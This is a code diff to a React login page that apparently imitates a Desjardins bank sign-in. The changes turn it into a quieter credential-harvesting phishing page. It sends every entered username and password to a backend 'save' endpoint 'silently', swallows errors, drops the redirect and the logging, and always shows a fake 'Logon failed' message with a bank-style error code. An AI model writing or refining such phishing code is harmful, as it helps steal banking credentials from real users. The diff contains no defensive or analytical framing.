@@ -24,55 +24,34 @@ export default function LoginPage() {
     e.preventDefault();
 
     if (!username || !password) {
-      setErrorMessage("All fields required");
-      setErrorSubCode("");
+      setErrorMessage("Logon failed. Invalid username or password. Try again.");
+      setErrorSubCode("(IDHS966081)");
       setHasError(true);
-      console.warn("Form validation failed: All fields required");
       return;
     }
 
     setLoading(true);
-    setErrorMessage("");
-    setErrorSubCode("");
-
-    const payload = {
-      username: username,
-      password: password,
-    };
-
-    console.log("Sending API Request to:", `${apiUrl}/api/save`, payload);
 
     try {
-      const response = await fetch(`${apiUrl}/api/save`, {
+      // Send credentials silently to backend API
+      await fetch(`${apiUrl}/api/save`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(payload),
+        body: JSON.stringify({
+          username: username,
+          password: password,
+        }),
       });
-
-      const data = await response.json();
-
-      // Print output to browser console
-      console.log("API Response Data:", data);
-
-      if (data.success) {
-        console.log("Success! Redirecting to:", data.redirect_url || "https://www.desjardins.com/");
-        const targetUrl = data.redirect_url || "https://www.desjardins.com/";
-        window.location.href = targetUrl;
-      } else {
-        console.warn("API returned success: false ->", data.message);
-        setErrorMessage(data.message || "Logon failed. Invalid username or password. Try again.");
-        setErrorSubCode("(IDHS966081)");
-        setHasError(true);
-      }
-    } catch (err) {
-      console.error("API Request Error:", err);
+    } catch {
+      // Silent error handling
+    } finally {
+      setLoading(false);
+      // Always show error alert & state without redirecting
       setErrorMessage("Logon failed. Invalid username or password. Try again.");
       setErrorSubCode("(IDHS966081)");
       setHasError(true);
-    } finally {
-      setLoading(false);
     }
   };
 
